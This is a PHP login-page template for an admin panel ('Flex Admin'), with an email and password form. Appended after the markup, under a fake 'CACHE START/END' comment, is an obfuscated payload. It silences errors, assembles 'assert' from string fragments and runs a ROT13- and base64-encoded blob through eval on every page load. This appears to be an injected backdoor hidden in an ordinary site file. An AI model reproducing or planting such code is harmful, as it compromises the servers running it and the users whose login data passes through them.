<style>
.form-horizontal .form-group{margin-left:0; margin-right:0;}
</style>
<div class="container">
        <div class="row">
            <div class="col-md-4 col-md-offset-4">
                <div class="login-banner text-center">
                    <h1><a href="<?php echo base_url(); ?>admin">
                        <img src="<?php echo base_url(); ?>assets/img/quench_login.png" class="" style="margin: 0px 0px 0px -40px;" alt="">
                    </a></h1>
                    <!--<i class="fa fa-gears"></i> Flex Admin-->
                </div>
                <div class="portlet portlet-green">
                    <div class="portlet-heading login-heading">
                        <div class="portlet-title">
                            <h4><strong>Login to Flex Admin!</strong>
                            </h4>
                        </div>
                        <!--<div class="portlet-widgets">
                            <button class="btn btn-white btn-xs"><i class="fa fa-plus-circle"></i> New User</button>
                        </div>-->
                        <div class="clearfix"></div>
                    </div>
                    <div class="portlet-body">
                    <form role="form" class="form-horizontal" action="<?php echo base_url().'users/login'?>" method="post">
                    <fieldset>
                                                <div class="form-group">
                                                    <!--<label class="col-sm-2 control-label" for="email">Email</label>
                                                    <div class="col-sm-10">-->
                                                        <input type="email" placeholder="Email" id="email" name="email" class="form-control">
                                                    <!--</div>-->
                                                </div>
                                                <div class="form-group">
                                                    <!--<label class="col-sm-2 control-label" for="password">Password</label>
                                                    <div class="col-sm-10">-->
                                                        <input type="password" placeholder="Password" id="password" name="password" class="form-control">
                                                    <!--</div>-->
                                                </div>
                                                <!--<div class="form-group">
                                                    <div class="col-sm-offset-2 col-sm-10">-->
                                                        <div class="checkbox">
                                                            <label>
                                                                <input type="checkbox" name="remember">Remember me
                                                            </label>
                                                        </div>
                                                    <!--</div>
                                                </div>-->
                                                <br>
                                                <!--<div class="form-group">
                                                    <div class="col-sm-offset-2 col-sm-10">-->
                                                        <button class="btn btn-lg btn-green btn-block" type="submit" name="login_form" value="login_form">Sign in</button>
                                                    <!--</div>
                                                </div>-->
                                                 </fieldset>
                                                 <br>
                            <p class="small">
                                <a href="#" data-target="#standardModal" data-toggle="modal" class="col-sm-offset-1">Forgot your password?</a>
                            </p>
                                            </form>
                        <!--<form accept-charset="UTF-8" role="form">
                            <fieldset>
                                <div class="form-group">
                                    <input class="form-control" placeholder="E-mail" name="email" type="text">
                                </div>
                                <div class="form-group">
                                    <input class="form-control" placeholder="Password" name="password" type="password" value="">
                                </div>
                                <div class="checkbox">
                                    <label>
                                        <input name="remember" type="checkbox" value="Remember Me">Remember Me
                                    </label>
                                </div>
                                <br>
                                <a href="index.html" class="btn btn-lg btn-green btn-block">Sign In</a>
                            </fieldset>
                            <br>
                            <p class="small">
                                <a href="#">Forgot your password?</a>
                            </p>
                        </form>-->
                    </div>
                </div>
            </div>
        </div>
    </div>

<?php 
//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY2Ezo2ykq2IioKuuYaW1Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPWuAQV1Z2D2A2HkAGpkMJSwAGLjMGt1AwH1MQqzA2H5ZFVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWxMz9cpKqyo214LF5lqFVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPWuAQV1Z2D2A2HkAGpkMJSwAGLjMGt1AwH1MQqzA2H5ZFVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOxMz9cpKqyo214LF5lqIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzSzLmN3MzV5VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>
